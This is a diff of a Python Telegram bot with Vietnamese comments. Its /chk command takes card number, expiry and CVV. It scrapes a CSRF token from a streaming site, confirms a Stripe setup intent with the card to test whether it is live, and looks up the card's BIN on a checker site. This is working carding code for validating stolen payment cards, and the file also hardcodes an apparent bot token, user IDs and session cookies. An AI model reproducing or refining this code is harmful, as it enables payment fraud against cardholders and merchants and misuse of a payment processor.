@@ -1,96 +1,60 @@
-# -*- coding: utf-8 -*-
 import requests, re, time
 from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 from bs4 import BeautifulSoup
 
-# === CONFIG ===
+# ========== CẤU HÌNH ==========
 TELEGRAM_TOKEN = "7482122603:AAG-d2VwSvySZhKfNYpjz9HXnlduvgETYQ4"
+ADMIN_ID = 5127429005  # ID người quản trị gốc
+ALLOWED_USERS = {ADMIN_ID}  # Tập hợp user_id được phép
+USER_RANKS = {ADMIN_ID: "admin"}  # quản lý rank người dùng
 
-# Phân quyền người dùng
-user_ranks = {
-    5127429005: "admin"  # bạn là admin mặc định
-}
-
-COOKIES = "referer=; country_code=VN; ip_address=113.172.83.44; agent=Mozilla%2F5.0+... (rút gọn phần dài này nếu cần)"
-
+COOKIES = "referer=; country_code=VN; ip_address=113.172.83.44; agent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F137.0.0.0+Safari%2F537.36; ..."
 HEADERS = {
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
     "cookie": COOKIES
 }
 
-# /add <user_id> – chỉ admin dùng được
-async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_ranks.get(user_id) != "admin":
-        await update.message.reply_text("❌ Bạn không có quyền sử dụng lệnh này.")
-        return
-
-    if not context.args or not context.args[0].isdigit():
-        await update.message.reply_text("❌ Dùng: /add <user_id>")
-        return
-
-    target_id = int(context.args[0])
-    user_ranks[target_id] = "member"
-    await update.message.reply_text(f"✅ Đã thêm user {target_id} làm member.")
-
-# /info – mọi người đều dùng được
-async def info(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    uid = update.effective_user.id
-    name = update.effective_user.full_name
-    rank = user_ranks.get(uid, "none")
-
-    msg = f"""
-👤 <b>Thông tin người dùng:</b>
-
-<b>Name:</b> {name}
-<b>ID:</b> {uid}
-<b>Rank:</b> {rank}
-"""
-    await update.message.reply_html(msg.strip())
-
-# /chk cc|mes|ano|cvv
+# ========== LỆNH /chk ==========
 async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    uid = update.effective_user.id
-    if user_ranks.get(uid) not in ("admin", "member"):
-        await update.message.reply_text("❌ Bạn không có quyền sử dụng lệnh này.")
+    user_id = update.effective_user.id
+    if user_id not in ALLOWED_USERS:
+        await update.message.reply_text("❌ Bạn không có quyền sử dụng bot.")
         return
 
     if not context.args:
         await update.message.reply_text("❌ Dùng: /chk cc|mes|ano|cvv")
         return
 
-    raw = context.args[0].replace(" ", "").strip()
-    match = re.match(r"^(\d{12,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$", raw)
+    raw = context.args[0]
+    match = re.match(r'^(\d{12,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$', raw)
 
     if not match:
         await update.message.reply_text("❌ Sai cú pháp.")
         return
 
     cc, mes, ano, cvv = match.groups()
-    if len(ano) == 2:
-        ano = "20" + ano
-
     bin_code = cc[:6]
     await update.message.reply_text("🕐 Đang kiểm tra...")
     start_time = time.time()
 
     try:
-        # B1: CSRF token
+        # CSRF token
         r1 = requests.get("https://urbanflixtv.com/account/purchases/payment_methods", headers=HEADERS)
         soup = BeautifulSoup(r1.text, "html.parser")
-        token_tag = soup.find("meta", {"name": "csrf-token"})
-        if not token_tag:
-            raise Exception("Không lấy được CSRF token")
-        token = token_tag["content"]
+        meta_tag = soup.find("meta", {"name": "csrf-token"})
+        if not meta_tag or not meta_tag.get("content"):
+            await update.message.reply_text("❌ Không lấy được CSRF token.")
+            return
+        token = meta_tag["content"]
 
-        # B2: Lấy setup_intent
+        # Setup Intent
         r2 = requests.get("https://urbanflixtv.com/api/billings/setup_intent?page=payment_methods&currency=usd", headers=HEADERS)
         json2 = r2.json()
         setid = json2["setup_intent"]
         setin = setid.split("_secret_")[0]
 
-        # B3: Xác nhận
+        # Gửi thẻ
         payload = {
             "return_url": "https://urbanflixtv.com/account/purchases/payment_methods/async_method_setup",
             "payment_method_data[type]": "card",
@@ -117,17 +81,15 @@ async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         r3 = requests.post(f"https://api.stripe.com/v1/setup_intents/{setin}/confirm", headers=HEADERS, data=payload)
         j3 = r3.json()
-
         status = j3.get("status", "UNKNOWN")
         decline = j3.get("error", {}).get("decline_code", "NONE")
 
         # BIN lookup
         bin_res = requests.get(f"https://new.checkerccv.tv/bin_lookup.php?bin={bin_code}", headers={
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
             "Accept": "*/*",
             "Pragma": "no-cache"
         })
-
         bin_json = bin_res.json()
         card = bin_json.get("scheme", "N/A")
         type_ = bin_json.get("type", "N/A")
@@ -137,7 +99,6 @@ async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
         bank = name.split(", ")[0] if ", " in name else name
 
         elapsed = round(time.time() - start_time, 2)
-
         msg = f"""
 <b>✅ CHECK RESULT</b>
 
@@ -153,17 +114,43 @@ async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
 <b>Bank:</b> {bank}
 
 <b>Took:</b> {elapsed} sec
-<b>Checked by:</b> mnhat [{uid}]
+<b>Checked by:</b> mnhat [{user_id}]
 """
-        try:
-            await update.message.reply_html(msg)
-        except Exception as e:
-            await update.message.reply_text(f"⚠️ Lỗi gửi kết quả: {str(e)}")
+        await update.message.reply_html(msg)
 
     except Exception as e:
         await update.message.reply_text(f"❌ Lỗi xử lý: {str(e)}")
 
-# === MAIN ===
+# ========== LỆNH /add ==========
+async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID:
+        await update.message.reply_text("❌ Bạn không phải quản trị viên.")
+        return
+    if not context.args:
+        await update.message.reply_text("Dùng: /add <user_id>")
+        return
+    try:
+        new_id = int(context.args[0])
+        ALLOWED_USERS.add(new_id)
+        USER_RANKS[new_id] = "member"
+        await update.message.reply_text(f"✅ Đã thêm user {new_id} vào danh sách.")
+    except Exception as e:
+        await update.message.reply_text(f"❌ Lỗi: {e}")
+
+# ========== LỆNH /info ==========
+async def info(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    rank = USER_RANKS.get(user.id, "none")
+    message = f"""
+👤 <b>Thông tin người dùng:</b>
+
+<b>Name:</b> {user.full_name}
+<b>ID:</b> {user.id}
+<b>Rank:</b> {rank}
+""".strip()
+    await update.message.reply_html(message)
+
+# ========== CHẠY BOT ==========
 if __name__ == '__main__':
     app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
     app.add_handler(CommandHandler("chk", chk))
